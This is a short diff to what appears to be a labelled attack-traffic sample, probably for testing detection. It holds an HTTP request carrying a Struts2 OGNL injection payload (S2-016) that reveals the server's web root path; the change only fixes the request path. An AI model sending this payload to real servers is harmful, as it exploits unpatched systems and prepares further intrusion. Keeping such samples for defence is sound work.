@@ -1,5 +1,5 @@
 # 高危攻击请求，对应 Struts2 OGNL 注入漏洞（CVE-2013-1966 / S2-016）。
-GET index.action?redirect:${#a=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#b=#a.getRealPath("/"),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#b),#matt.getWriter().flush(),#matt.getWriter().close()} HTTP/1.1
+GET /index.action?redirect:${#a=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#b=#a.getRealPath("/"),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#b),#matt.getWriter().flush(),#matt.getWriter().close()} HTTP/1.1
 Host: 10.10.3.128:2280
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
